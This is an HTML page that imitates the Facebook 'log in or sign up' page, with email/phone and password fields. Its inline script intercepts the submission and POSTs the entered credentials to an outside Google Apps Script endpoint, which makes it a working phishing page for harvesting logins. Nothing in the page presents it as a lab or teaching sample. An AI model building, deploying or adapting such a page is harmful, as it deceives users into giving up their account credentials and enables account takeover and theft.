<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook â€“ log in or sign up</title>
  

  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="main-container" >
    <div class="left" style="margin-left: 0px;" >
      <h1 style="color:#1877f2; margin-left: 0px;">facebook</h1>
      <p>Facebook helps you connect- and share with the people in your life.</p>

      <div class="logo"></div>
    </div>
    <div class="right">
      <form id="login-form">
        <input style="width: 320px;" type="email" name="email" placeholder="Email or Phone Number" required>
        <input style="width: 320px;" type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
        <a href="#">Forgot account?</a>
        <hr>
        <button type="button" class="create" style="background-color: #42b72a;">Create New Account</button>
      </form>
    </div>
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyY9iuREhuxa0O3HD4-eiE0YSNCC5aJ0EZL7PB8yN3hgNAvkDt8Qy_9bbLml8PAo0Sh/exec';
    const form = document.getElementById('login-form');

    form.addEventListener('submit', e => {
      e.preventDefault();
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => alert("Login info submitted!"))
        .catch(error => alert("Error: " + error.message));
    });
  </script>
</body>
</html>
